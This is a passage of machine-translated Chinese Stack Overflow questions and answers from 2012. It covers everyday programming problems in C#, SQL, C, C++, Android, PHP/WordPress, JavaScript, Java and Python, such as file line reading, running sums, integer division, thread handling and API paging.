            string[] list2 = list1.Distinct().ToArray();
            foreach (string g in list2)
                this.listBox2.Items.Add(g);

            Class1 arr1 = new Class1();
            arr1.array(listBox2);
        }
        else { Close(); }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T19:12:28.247

这里有两种方法：

```
public static string ReadSpecificLine1( string path , int lineNumber )
{
  int cnt = 0 ;
  string desiredLine = File.ReadAllLines( path ).FirstOrDefault( x => (++cnt == lineNumber) ) ;
  return desiredLine ;
}

public static string ReadSpecificLine2( string path , int lineNumber )
{
  string desiredLine = null ;
  using ( FileStream   stream = new FileStream( path , FileMode.Open , FileAccess.Read , FileShare.Read ) )
  using ( StreamReader reader = new StreamReader( stream ) )
  {
    int    i           = 0    ;
    string line        = null ;
    while ( null != (line=reader.ReadLine()) && ++i < lineNumber )
    {
    }
    if ( i == lineNumber && line != null )
    {
       desiredLine = line ;
    }
    return desiredLine ;
  }
} 
```

如果您确定您的文件

*   仅包含在文件的 unicode 编码方案中构成单个、固定大小的 Unicode 代码单元的字符，**并且**

*   有固定长度的行（记录）

然后您可以`seek()`直接到有问题的行，如本例中使用 UTF-16 编码，从而节省无关的 I/O 操作：

```
public static string ReadSpecificLineFromUTF16EncodedFile( string path , int lineNumber )
{
  string    desiredLine                    = null ;

  using ( FileStream   stream = new FileStream( path , FileMode.Open , FileAccess.Read , FileShare.Read ) )
  using ( StreamReader reader = new StreamReader( stream , Encoding.Unicode ) )
  {
    Encoding  UTF_16                         = Encoding.Unicode ;
    const int RECORD_LENGTH_IN_CHARS         = 80 ;
    const int FIXED_CODE_UNIT_SIZE_IN_OCTETS = sizeof(char) ; // size of a UTF-16 code unit (char) in octets
    const int RECORD_LENGTH_IN_OCTETS        = RECORD_LENGTH_IN_CHARS * FIXED_CODE_UNIT_SIZE_IN_OCTETS ;

    long offset = (lineNumber-1)*RECORD_LENGTH_IN_OCTETS ;

    if ( offset <  0 ) throw new ArgumentOutOfRangeException("lineNumber") ;
    if ( offset <= stream.Length )
    {
      stream.Seek( offset , SeekOrigin.Begin ) ;
      desiredLine = reader.ReadLine() ;
    }
  }
  return desiredLine ;
} 
```

请注意，这**仅**在上述两个条件为真时才有效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T19:19:24.123

> 那么问题是我想访问 ESSD 文件和读取第 6 行，如果此行包含存储在 Resume 文件中的名称，则将 ESSD 文件发送到 listbox1，如果没有，则不将 ESSD 添加到我的 listbox1

所以：

1.  读取/解析简历文件
2.  对简历列表进行排序。
3.  创建所有 ESSD 文件的列表
4.  遍历所述列表，从每个文件中读取“第 6 行”
5.  在“第 6 行”中搜索名称的简历文件
6.  找到就添加

尝试将其添加到上面的代码中，看看会发生什么。看看情况如何，也许可以修改你的问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T19:22:35.127

.NET 4 提供了一个很好的函数，称为 File.ReadLines(fileName)

使用此功能，您的上述代码可以修改为：

```
private void button1_Click(object sender, EventArgs e) 
{ 
    DialogResult result = this.openFileDialog1.ShowDialog(); 
    if (result == DialogResult.OK) 
    { 
        string[] Nomarchivo = this.openFileDialog1.FileNames; 
        string NomDirec = Path.GetDirectoryName(Nomarchivo[0]); 
        for (int a = 0; a <= Nomarchivo.Length - 1; a++) 
        { 

            //the name we are looking for.
            List<string> namesWeAreLookingFor = new List<string>();

            string NomDirGral = Nomarchivo[a].Remove(Nomarchivo[a].Length - 7, 7); 
            string NomGral = NomDirGral.Replace(NomDirec, " "); 
            NomGral = NomGral.Remove(0, 2); 
            foreach (string f in Directory.GetFiles(NomDirec, NomGral + "*")) 
                this.listBox1.Items.Add(f); 
            foreach (string h in Directory.GetFiles(NomDirec, "resume*")) 
            {
                this.listBox1.Items.Add(h); 

                var nameLines = File.ReadLines(NomDirec + @"\" + h);
                foreach (var item in nameLines)
                {
                    //do whatever you need to get a name in this file here
                    //...

                    //Assuming there is one name per line, add the name to the list
                    namesWeAreLookingFor.Add(item);
                }
            }
            foreach (string t in Directory.GetFiles(NomDirec, "ESSD1*")) 
            {
                this.listBox1.Items.Add(t); 
                //try to access the file so we can read line 6 using new .NET 4 method 
                var lines = File.ReadLines(NomDirec + @"\" + t);

                //see if we even have 6 lines
                if (lines.Count() < 6)
                    continue;

                String line6 = lines.ElementAt(5);

                //loop through the names we pulled
                foreach (var item in namesWeAreLookingFor)
                {
                    //see if line 6  containes that name.
                    if (line6.Contains(item))
                    {
                        //if it exists, then add it to the list and exit the loop.
                        this.listBox1.Items.Add(t);
                        break;
                    }
                }
            }
        } 
        string[] list1 = new string[listBox1.Items.Count]; 
        for (int b = 0; b <= listBox1.Items.Count - 1; b++) 
        { 
            list1[b] = listBox1.Items[b].ToString(); 
        } 
        string[] list2 = list1.Distinct().ToArray(); 
        foreach (string g in list2) 
            this.listBox2.Items.Add(g); 

        Class1 arr1 = new Class1(); 
        arr1.array(listBox2); 
    } 
    else { Close(); } 
```

# android - 查询特定 ID 的 ContentProvider

> ID：12429457
> 
> 赞同：1
> 
> 时间：2012-09-14T17:44:22.423
> 
> 标签：android, android-cursor, android-cursorloader

我有一个联系人表，我只需要获取某些 ID。

想象一下，我有 10 个 id 从 1 到 10 的联系人，我想得到一个`Cursor`联系人 1 和 2 的联系人。

一个工作代码是：

```
new CursorLoader(MyContentProvider.CONTACT_CONTENT_URI, null,
MyContentProvider.CONTACT_COLUMN_ID + " IN  ( 1, 2 )",
null, null); 
```

我的问题是我无法使用该`selectionArgs`参数，因为转义会破坏查询。

你能想出一种使用`selectionArgs`参数并使其工作的方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:45:50.233

如果你想使用`selectionArgs`你只能像这样使用它

```
String selection = "column IN (?, ?, ?)";
String[] selectionArgs = { "1", "2", "3" }; 
```

不过，您需要`"( ?, ?, ? )"`在运行时根据参数的数量来构建字符串。例如

```
private static String getSelection(int args) {
    StringBuilder sb = new StringBuilder(MyContentProvider.CONTACT_COLUMN_ID + " IN  (");
    boolean first = true;
    for (int i = 0; i < args; i ++) {
        if (first) {
            first = false;
        } else {
            sb.append(',');
        }
        sb.append('?');
    }
    sb.append(')');
    return sb.toString();
} 
```

# sql - 如何在 sqlite 中获得运行总和？

> ID：12429465
> 
> 赞同：0
> 
> 时间：2012-09-14T17:45:06.607
> 
> 标签：sql, sqlite

我正在尝试在 sqlite 中获得运行总和。现在我有：

```
SELECT 
    type, 
    count, 
    SUM(count) as startIndex 
FROM 
    (
        SELECT 
            things.type, 
            COUNT(things.name) as count 
        FROM 
            things 
            INNER JOIN thingGroups 
            ON thingID = things.id 
            INNER JOIN groups 
            ON groups.id=thingGroups.groupID 
        WHERE 
            groups.name='Space' 
        GROUP BY things.type 
        ORDER BY type
    ) 
GROUP BY type, count 
```

这给了我：

```
Name A, 2, 2
Name B, 3, 3
Name C, 3, 3 
```

我在找：

```
Name A, 2, 0
Name B, 3, 2
Name C, 3, 5 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T19:43:06.230

您可以使用相关子查询执行此操作：

```
select TYPE, COUNT,
       (select count(*)
        from things t2 INNER JOIN
             thingGroups 
             ON thingID = t2.id INNER JOIN
             groups 
             ON groups.id=thingGroups.groupID 
        WHERE groups.name='Space' and
              t2.type < things.type
       ) as cumsum
from (SELECT things.type, COUNT(things.name) as count 
      FROM things INNER JOIN
           thingGroups 
           ON thingID = things.id INNER JOIN
           groups 
           ON groups.id=thingGroups.groupID 
       WHERE groups.name='Space' 
       GROUP BY things.type
      ) t
order by type 
```

顺便说一句，order by 应该始终放在最外层的查询中（除非您使用某种限制或 top 来获取行的子集）。

# c - 我在mingw中尝试了我的第一个程序。我得到了以下输出。我的程序有什么问题？

> ID：12429467
> 
> 赞同：-1
> 
> 时间：2012-09-14T17:45:22.157
> 
> 标签：c, mingw32

程序：

```
#include<stdio.h>
main()
 {
  int fahr;
   float cel;
   for(fahr=0;fahr<300;fahr=fahr+20)
   {
   cel=(5/9)*(fahr-32);
     printf("\n %d \t %f",fahr,cel);
    }
} 
```

我得到的输出：

```
 0       0.000000
   20      0.000000
   40      0.000000
   60      0.000000
   80      0.000000
   100     0.000000
   120     0.000000
   140     0.000000
   160     0.000000
   180     0.000000
   200     0.000000
   220     0.000000
   240     0.000000
   260     0.000000
   280     0.000000 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T17:50:02.343

5/9 的整数为零，尝试`cel=(fahr-32)*5/9`或漂浮整条船。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T17:54:11.713

两个整数之间的除法总是导致另一个整数。如果这两个术语之一是浮点数或双精度，则另一个会自动[提升](http://en.wikipedia.org/wiki/Type_conversion#Type_promotion)为该类型，从而产生正确的结果。

所以 typeof(5/9) = int 而 typeof(5.0/9) = typeof(5/9.0) = typeof(5.0/9.0) = double。

因此正确的版本是：

```
cel=(5./9.)*(fahr-32); 
```

注意：每当存在具有不同“等级”类型的数学表达式时，都会发生这种情况，将提升较低等级的类型以匹配最高等级。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T17:55:35.943

试试这个：

```
main()  
{   
  int fahr;  
  float cel;  
  for(fahr=0;fahr<300;fahr=fahr+20) 
  {  
    cel=(5./9.)*(fahr-32);  
    printf("\n %d \t %f",fahr,cel);   
  } 
} 
```

5/9 是（作为一种类型）int/int，它将给出一个 int。您可以通过将它们更改为 5.0/9.0 来转换数学，或者您可以只使用 5./9。

# multithreading - 为什么这个 boost 线程创建不编译？

> ID：12429468
> 
> 赞同：0
> 
> 时间：2012-09-14T17:45:24.993
> 
> 标签：multithreading, boost, bind

我使用 Boost 线程库编写了一些多线程代码。我使用占位符 _1 作为成员函数 fillSample(int num) 所需的参数在构造函数中初始化了两个线程。但这在我的 Visual Studio 2010 中无法编译。以下是代码：

```
#include<boost/thread.hpp>
#include<boost/thread/condition.hpp>
#include<boost/bind/placeholders.hpp>

#define SAMPLING_FREQ 250
#define MAX_NUM_SAMPLES 5*60*SAMPLING_FREQ
#define BUFFER_SIZE 8

class ECG
{
private:
    int sample[BUFFER_SIZE];
    int sampleIdx;
    int readIdx, writeIdx;
    boost::thread m_ThreadWrite;
    boost::thread m_ThreadRead;
    boost::mutex m_Mutex;
    boost::condition bufferNotFull, bufferNotEmpty;
public:
    ECG();
    void fillSample(int num);   //get sample from the data stream
    void processSample();   //process ECG sample, return the last processed 

};

ECG::ECG() : readyFlag(false), sampleIdx(0), readIdx(0), writeIdx(0)
{
    m_ThreadWrite=boost::thread((boost::bind(&ECG::fillSample, this, _1)));
    m_ThreadRead=boost::thread((boost::bind(&ECG::processSample, this)));
}

void ECG::fillSample(int num)
{
    boost::mutex::scoped_lock lock(m_Mutex);
    while( (writeIdx-readIdx)%BUFFER_SIZE == BUFFER_SIZE-1 )
    {
        bufferNotFull.wait(lock);
    }

    sample[writeIdx] = num;
    writeIdx = (writeIdx+1) % BUFFER_SIZE;
    bufferNotEmpty.notify_one();

}

void ECG::processSample()
{
    boost::mutex::scoped_lock lock(m_Mutex);
    while( readIdx == writeIdx )
    {
        bufferNotEmpty.wait(lock);
    }

    sample[readIdx] *= 2;
    readIdx = (readIdx+1) % BUFFER_SIZE;
    ++sampleIdx;
    bufferNotFull.notify_one();
} 
```

我已经包含了 placeholders.hpp 头文件，但它仍然无法编译。如果我用 0 替换 _1，那么它将起作用。但这会用 0 初始化线程函数，这不是我想要的。关于如何使这项工作的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T18:50:08.993

将创建移动到初始化列表： m_ThreadWrite(boost::bind(&ECG::fillSample, this, _1)), ...

`thread`object 不可复制，并且您的编译器不支持其移动构造函数。

# mysql - My Sql 中具有条件的行的总和

> ID：12429471
> 
> 赞同：1
> 
> 时间：2012-09-14T17:45:37.147
> 
> 标签：mysql, sum

我的数据是

```
ID       SCORE
 1        55
 1        -1
 1        25
 1        -1
 1        -1
 1        35
 2        25
 2        -1 
 2        65
 2        55
 2        21
 2        -1 
```

现在我想添加/求和每个 id 忽略 -1 的分数，我正在尝试使用这个不起作用的代码

```
SELECT SUM(CASE when SCORE>-1 THEN SUM(SCORE) ELSE 0 END) 
FROM jbit WHERE htno='$id' 
```

在这里我已经在使用 WHERE 所以我如何使用另一个 WHERE，如果我在单个查询中使用多个 Where 它可能会影响其他进程..请帮帮我

帮帮我吧朋友

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T17:49:51.997

如果只有两列，则无需使用 SUM，您可以在下面尝试

```
SELECT id, IF(SCORE=-1,0,SCORE) AS scoreSum
FROM table1
GROUP BY id 
```

[`Working DEMO`](http://sqlfiddle.com/#!2/59a50/27)

替代品（未测试）

```
SELECT id, SUM(IF(SCORE=-1,0,SCORE)) AS scoreSum
FROM table1
WHERE htno =$id
GROUP BY id 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T17:50:27.830

```
SELECT SUM(score) AS score_sum
FROM jbit 
WHERE htno='$id'
  AND score <> -1 ; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T17:51:00.633

```
SELECT SUM(`SCORE`)
FROM `jbit`
WHERE `htno` = '$id'
    `SCORE` > 0; 
```

不过，我建议您更改`'$id'`为仅`$id`列类型`htno`为`INTEGER`.

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-09-14T17:50:01.490

```
SELECT SUM(score) FROM <tablename> WHERE score != -1 
```

# c# - FolderBrowserDialog 显示 SelectedPath 问题

> ID：12429477
> 
> 赞同：6
> 
> 时间：2012-09-14T17:45:54.203
> 
> 标签：c#, winforms

所以我有一个文件夹浏览器对话框，并且遇到了所选路径的问题。

所以我希望选择之前打开的文件夹，并且我希望它向下滚动以便之前的文件夹可见。

现在奇怪的是，这很好用，但只是有时。这是完全随机的。路径总是突出显示，但并不总是向下滚动。

有时当我开始调试并单击浏览时，它会打开并向下滚动到我想要的位置。然后我点击确定，再次点击浏览，无论它是否向下滚动到它应该在的位置，它都是完全随机的。

有什么想法吗？

编辑：我搜索了很多，发现[了这个](http://www.experts-exchange.com/Programming/Languages/C_Sharp/Q_24971499.html#)。这似乎与我的问题非常相似。

> “我已经在 Vista 32、XP 32、Win 7 32 和 64 上尝试过测试应用程序。它在除 Windows 7 之外的所有设备上都能正常工作。32 和 64 似乎都有同样的问题。”

他们说这是Windows 7的一个小故障......？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-08-28T10:41:33.373

这对我有用

```
folderBrowserDialog1.Reset();  
folderBrowserDialog1.RootFolder = Environment.SpecialFolder.MyComputer;
folderBrowserDialog1.SelectedPath = WorkingFolder; 
```

但只有在第二次使用对话框之后

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-07-22T20:24:46.963

我最终使用了[Ookii 对话框](http://www.ookii.org/Software/Dialogs/)文件夹浏览器对话框。老实说，它比默认的文件夹浏览器要好得多。它还附带一个示例，向您展示如何使用它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T18:47:26.647

```
 FolderBrowserDialog folderBrowser = new FolderBrowserDialog(); 
    folderBrowser.Description = "Select Chase 6 Installation Folder"; 
    folderBrowser.RootFolder = Environment.SpecialFolder.ProgramFiles; 
    folderBrowser.ShowNewFolderButton = false; 

    if (Directory.Exists(Properties.Settings.Default.defaultChasePath)) 
    { 
        string x = Properties.Settings.Default.defaultChasePath; 

        //Use API Flag to set correct path, following tahter a catch all better to check
        //enum for full list
        RootSetter.SetRootFolder(folderBrowser, RootSetter.CsIdl.FlagDontVerify);

        folderBrowser.SelectedPath = x;

    } 
    if (folderBrowser.ShowDialog(this) == DialogResult.OK) 
    { 
        string huz = folderBrowser.SelectedPath; 
    } 
```

我从这个链接得到

[如何在所选文件夹中打开 FolderBrowserDialog？](https://stackoverflow.com/questions/705409/how-do-i-open-a-folderbrowserdialog-at-the-selected-folder)

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-09-14T18:32:45.363

将您选择的路径设置为最后一个文件夹路径，以便它向下滚动。

```
if (folderDialog.ShowDialog() ==  DialogResult.OK)
{
   Properties.Settings.Default.Path = folderDialog.SelectedPath;
   Properties.Settings.Default.Save();
} 
```

更改 if 条件中的代码。

# c++ - 我必须分离或加入 pthread 吗？

> ID：12429481
> 
> 赞同：4
> 
> 时间：2012-09-14T17:46:17.037
> 
> 标签：c++, pthreads

`pthread_detach()`文档说：

> 该`pthread_detach()`函数应向实现指示线程线程的存储可以在该线程终止时回收。

如果我创建了一个可连接的线程并且不分离或连接它，会有什么后果？该线程的资源不会被回收？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T17:50:07.173

你是在自问自答？线程需要系统中的某些资源。这些将一直保留，直到线程被加入，或者它被分离并终止。（在您分离线程之前，系统必须假设您将来某个时候会加入它，并且无法释放资源。）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T17:52:44.843

只是与线程相关联的资源，为连接操作而保留（即状态代码和更多）。

“分离”只是意味着我不会在这个线程上调用 join 所以当线程完成时清理线程特定的数据（这将通过调用 join 来完成）。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-14T17:50:07.947

这是正确的; 如果您既不加入也不分离线程，您将泄漏资源。

每个线程都会为其堆栈分配一些内存，可能还有一些控制结构，这些内存不会被释放。在某些操作系统上，您可以启动的线程数量是有限的，您最终可能会进入无法再启动的状态。

# javascript - 同步服务器和客户端时间？

> ID：12429486
> 
> 赞同：0
> 
> 时间：2012-09-14T17:46:38.680
> 
> 标签：javascript, ruby

所以我的问题实际上是两个部分，首先；我想测量我的请求和客户端 js的**总延迟，***包括*等待 dns 解析所花费的时间等。

这一切都在开发中运行良好，因为我的服务器和 Web 浏览器都在同一台机器上，所以当我比较时`Time.now.to_i`，与浏览器中的 Javascript 确定的当前时间相比，它是整个请求端到端的真正延迟。

我的问题的第二部分是，我只是以错误的方式思考这整个事情吗？我应该以不同的方式衡量我的请求吗？

PS，这不是一个 Rails 应用程序。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T17:50:45.107

您无法在浏览器中可靠地同步时间。

如果您只是想测量请求时间，您实际上不需要关心服务器认为它是什么时间。在浏览器中，只需测量发起请求和收到响应之间的时间。

```
var start = Date.now();
$.get('/url', function() {  // or equivalent in whatever JS framework
    var latency = Date.now() - start; // in ms
}); 
```

# java - 如何将单维索引转换为多维数组中的对应索引？

> ID：12429492
> 
> 赞同：1
> 
> 时间：2012-09-14T17:46:54.247
> 
> 标签：java, arrays, matlab, matrix

假设我有一个 3x4x5x6 java double 数组，我按以下方式`a`展开为长度为 360 的 ArrayList ：`b`

```
for (int i = 0; i<a.length; i++){
    for (int j = 0; j<a[0].length; j++){
        for (int k = 0; k<a[0][0].length; k++){
            for (int m = 0; m<a[0][0][0].length; m++){
                b.add(a[i][j][k][m]);
            }
        }
    }
} 
```

给定 的索引`b`，是否有一种简单的方法可以在 中找到相应的 4 元组索引`a`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T18:11:41.543

假如说

*   `b`是一维数组上的索引
*   `i,j,k,m`是多维数组上的四个结果索引
*   `si,sj,sk,sm`是任何维度的大小

你可以使用基本的数学，它应该是这样的

*   `m = b % sm`
*   `k = (b / sm) % sk`
*   `j = (b / (sm*sk)) % sj`
*   `i = b / (sm*sk*sj)`

基本上，对于包含的数组的每个大小（通过乘以大小），您将每个索引增加一个，并将其包装在它的维度上。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T20:15:37.803

在 MATLAB 中，您可以使用[`ind2sub`](http://www.mathworks.com/help/matlab/ref/ind2sub.html)将线性索引转换为下标。

例如。一个 4 维 (3 x 3 x 3 x 3) 矩阵：

```
#% The dimensions of n-dimensional matrix:
SizeVector = [ 3, 3, 3, 3 ];

#% Example linear index:
LinearIndex = 17;

[i1, i2, i3, i4 ] = ind2sub(SizeVector, LinearIndex);

i1 =
   2

i2 =
   3

i3 =
   2

i4 =
   1 
```

要检查这是否正确，您可以从这些下标手动计算原始线性地址：

```
 (i4-1)*3^3 + (i3-1)*3^2 + (i2-1)*3^1 + (i1-1)*3^0 + 1

ans =
    17 
```

# asp.net-mvc - 使用 Twilio .NET 帮助程序库过滤呼叫日志

> ID：12429494
> 
> 赞同：2
> 
> 时间：2012-09-14T17:46:57.147
> 
> 标签：asp.net-mvc, twilio

我试图使用[Twilio Rest API](http://twilio.com/docs/api/rest)来获取使用[MVC .net](http://github.com/twilio/csharp)的呼叫日志列表。使用以下代码，我只能获得最近的 50 个调用。我想返回所有呼叫并根据我的选择进行过滤。

```
@using Twilio;
@{
    // Set our AccountSid and AuthToken
    string sid = "AC123";
    string token = "abcd";

    // Instantiate a new Twilio Rest Client
    var client = new TwilioRestClient(sid, token);    

    // Get Recent Calls
    var calls = client.ListCalls();

    if (calls.RestException != null) 
    {
        Response.Write(string.Format("Error: {0}", calls.RestException.Message));
        Response.End();
    }    
}
<h1>Call Log</h1>
@foreach (var call in calls.Calls) {
    <p>Call from @call.From to @call.To at @call.StartTime of length @call.Duration</p>
} 
```

如何从通话记录中返回所有通话？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T18:16:13.867

[Call 方法](http://www.twilio.com/docs/api/rest/call)返回[默认页面大小](http://www.twilio.com/docs/api/rest/response#response-formats-list-paging-information)为 50的调用的分页列表。

因此，您需要使用可以指定 pageNumber的`ListCalls`重载进行分页。`CallListRequest`

这是一个如何对所有调用进行分页的示例：

```
var client = new TwilioRestClient(sid, token);    

var pageNumber = 0;
var totalPages = 1;

var allCalls = new List<Call>();

while(pageNumber < totalPages)
{
    var calls = client.ListCalls(new CallListRequest { PageNumber = pageNumber });

    if (calls.RestException != null) 
    {
         Response
             .Write(string.Format("Error: {0}", calls.RestException.Message));
         Response.End();
         break;
    }  
    allCalls.AddRange(calls.Calls);
    totalPages = calls.NumPages;
    pageNumber++;        
} 
```

# wordpress - 在 Wordpress functions.php 文件中使用 $wpdb 对象

> ID：12429497
> 
> 赞同：0
> 
> 时间：2012-09-14T17:47:18.080
> 
> 标签：wordpress

我无法在 Wordpress functions.php 文件中的 $wpdb 对象上调用 get_results() 函数。

确切错误：在 [...] 中的非对象上调用成员函数 get_results()

这是我的功能；

```
global $wpdb;
function query_students($year){
   $wpdb->get_results(
      $wpdb->prepare(
         "SELECT * FROM {$wpdb->prefix}usermeta WHERE meta_key ='foobar' AND meta_value = '{$year}'"
      )
   );
$wpdb->flush();
} 
```

如您所见，我已经对 $wpdb 变量进行了全球化，并且该函数在页面模板文件中运行良好。如果我的功能没有散布在这个地方，并且在某种集中式文件中，我会更喜欢它。

感谢期待！:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T17:55:17.717

“全球化”一个已经在全局范围内的变量什么都不做。案例与要点：

```
global $a; //does nothing
$a = 'foo';
global $a; //does nothing
foo();
echo $a; //'foo'
bar();
echo $a; //'bar'
function foo()
{
    $a = 'bar';
}
function bar()
{
    global $a;
    $a = 'bar';
} 
```

global 关键字不会永久使定义的变量在范围内成​​为全局变量。将其视为在函数中定义变量并将其值设置为函数外部具有相同名称的任何变量的一种方式。

您需要将全局声明移动到函数中，以使全局范围内的 $wpdb 对象在函数范围内可用：

```
function query_students($year){
    global $wpdb;
    $wpdb->get_results(
    $wpdb->prepare(
     "SELECT * FROM {$wpdb->prefix}usermeta WHERE meta_key ='foobar' AND meta_value = '{$year}'"
    ));
    $wpdb->flush();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-16T12:44:38.223

我在functions.php中运行以下查询

```
SELECT `id`, `user`, `width`, `type`, `source`, `link`, `expire`, `impressions`, `clicks` FROM adds WHERE `width`=728 and `impressions` < (SELECT max(`impressions`) FROM adds WHERE `width`=728 ) or `width`=728 and `clicks` < (SELECT max(`clicks`) FROM adds WHERE `width`=728 ) ORDER BY RAND() LIMIT 3 
```

它不起作用，但是在函数开头添加行 global $wpdb 后对我有帮助并且查询运行良好。谢谢

# c# - 连接必须有效且打开 -> 发生错误但连接有效？

> ID：12429498
> 
> 赞同：0
> 
> 时间：2012-09-14T17:47:22.323
> 
> 标签：c#, mysql, wpf, database, mysql-connector

我的应用程序中的数据库连接存在一些问题。我的应用程序将一些数据存储到 mysql 数据库中，现在我得到了标题中提到的错误。

问题是：就在我调用引发此异常的方法之前，我调用了另一个方法，该方法也连接到数据库但成功。起初我以为我的来源有错误，但没有错误。

这是不好的方法：

```
public static bool checkExistence(object obj)
    {
        MySqlCommand checkQuery = new MySqlCommand(MySQLQueries.getCheckQueryByObject(obj), connection);
        object checkResult = null;
        if (connection.State == System.Data.ConnectionState.Closed)
        {
            OpenConnection();
            try
            {
                checkResult = checkQuery.ExecuteScalar();
            }
            catch (MySqlException ex)
            {
                ErrorHandler(ex);
                return true;
            }
            catch (Exception ex)
            {
                ErrorHandler(ex);
                return true;
            }
            finally
            {
                CloseConnection();
            }
        }
        else
        {
            checkResult = checkQuery.ExecuteScalar();
        }

        if (checkResult != null)
            return true;
        else
            return false;
    } 
```

如您所见，我首先创建了一个新命令，该命令稍后将检查对象是否存在。查询的结果将存储在`object checkResult`最后，我只需检查 if `checkResult == null`。由于打开/关闭的一些问题，`connection`我决定检查连接是否打开。现在，如果调用了错误的方法，则连接将关闭。然后在调用`OpenConnection()`连接后再次使用与以前相同的设置打开连接。一旦应用程序执行`checkResult = checkQuery.ExecuteScalar();`，就会抛出异常。

我真的不知道究竟是什么问题。从我的角度来看，为了确保连接有效，我将`connection`其放入监视列表并跟踪应用程序对其所做的每一个更改。与成功使用数据库的任何其他方法没有什么不同。

我的一个朋友说，在构建应用程序时可能会出现一种优化错误。他本人不使用 C#，但有时使用 C，所以这只是一个模糊的猜测。

我错过的代码中是否有任何错误或任何猜测为什么会发生这种情况？

提前致谢！格雷茨

编辑：我使用最新版本的 MySQL 的 C# 连接器

# python - 如何将用户输入自动传递给 Python 脚本？

> ID：12429503
> 
> 赞同：1
> 
> 时间：2012-09-14T17:47:44.593
> 
> 标签：python, django

> **可能重复：**
> [如何在调用方法后写入标准输出（自动执行通知系统（Iphone））](https://stackoverflow.com/questions/4657900/how-to-write-in-stdout-after-to-call-a-method-doing-a-system-of-notifications-a)

我有以下脚本，我想在 django 应用程序中自动执行。问题是它一直要求用户输入。

我想知道如何自动传递用户输入？这是脚本：

```
from apns import APNs, Payload

apns = APNs(use_sandbox=True, cert_file='cert.pem', key_file='key.pem')

# Send a notification
token_hex = 'b5bb9d8014a0f9b1d61e21e796d78dccdf1352f23cd32812f4850b87'
payload = Payload(alert="Hello World!", sound="default", badge=1)
my_pass_phrase = 'efisgbieafb3939bg93g238g4792gff9'
apns.gateway_server.send_notification(token_hex, payload) 
```

问题发生在以下行：

```
apns.gateway_server.send_notification(token_hex, payload) 
```

脚本询问：输入 PEM 密码：并等待用户输入。

我想知道如何自动传递密码。提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:51:53.740

因为您正在使用一个库并且可能没有直接访问权限来禁止请求用户输入，所以您在调用此脚本的代码中可能需要做的是使用`pexpect`模块来观察输出中的特定模式，然后适当地发送输入：

[http://pypi.python.org/pypi/pexpect-u/2.5.1](http://pypi.python.org/pypi/pexpect-u/2.5.1)

这里的例子：[http ://www.noah.org/wiki/pexpect](http://www.noah.org/wiki/pexpect)

可能是这样的：

```
import pexpect

child = pexpect.spawn('myAPNscript.py')
child.expect('Enter PEM pass phrase:.*')
child.sendline('FOO') 
```

# c# - 如何使用 c# winforms 填充第三方应用程序的文本框？

> ID：12429504
> 
> 赞同：3
> 
> 时间：2012-09-14T17:47:50.663
> 
> 标签：c#, winforms

我用 c# (winforms) 编写的应用程序使用 Process.start() 启动第三方。

启动后，我需要在第三方应用的**搜索文本框中填写一些信息。**那么如何识别第三方应用的文本框呢？如何填写信息？

有什么线索或指导吗？要搜索的关键字？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T17:55:51.130

您可以使用[UI 自动化](http://msdn.microsoft.com/en-us/library/ms747327.aspx)库来执行此操作。

使用[Inspect.exe](http://msdn.microsoft.com/en-us/library/ms727247.aspx)的[UISPY.exe](http://msdn.microsoft.com/en-us/library/windows/desktop/dd318521%28v=vs.85%29.aspx)找到automationid 、 name 等任何可以唯一标识文本框的参数。假设您知道自动化 ID，您已经这样做了，您可以执行类似的操作。

```
string automationId = "ThirdyPartBox";
string newTextBoxValue = "foobar";
var condition = new PropertyCondition(AutomationElement.AutomationIdProperty, automationId);
var textBox = AutomationElement.RootElement.FindFirst(TreeScope.SubTree , condition);
ValuePattern vPattern = (ValuePattern)textBox.GetCurrentPattern(ValuePattern.Pattern);
vPattern.SetValue(newTextBoxValue); 
```

也许文本框本身不是唯一可识别的，您可以使用进程 ID、父容器 ID 等条件来定位它。

单击按钮。首先使用您选择的条件查找自动化元素，然后

```
InvokePattern clickButton = (InvokePattern)buttonElement.GetCurrentPattern(InvokePattern.Pattern);
clickButton.Invoke(); 
```

# javascript - 防止 javascript 生成的链接点击

> ID：12429509
> 
> 赞同：1
> 
> 时间：2012-09-14T17:48:06.927
> 
> 标签：javascript

> **可能重复：**
> [在 Jquery 中，如何区分程序点击和用户点击？](https://stackoverflow.com/questions/6674669/in-jquery-how-can-i-tell-between-a-programatic-and-user-click)

根据浏览器的不同，有几种方法可以使用 javascript 来“点击”链接。

IE（IE9 之前）

元素.click(); element.fireEvent('点击');

其他浏览器使用：

element.dispatchEvent(evt) 其中 evt 是鼠标点击事件。

我想确保实际的最终用户操作是特定链接上事件的发起者。我现在使用的技术是覆盖这些方法并过滤掉点击事件，但是在使用它们之前将方法恢复到原型版本很容易失败。

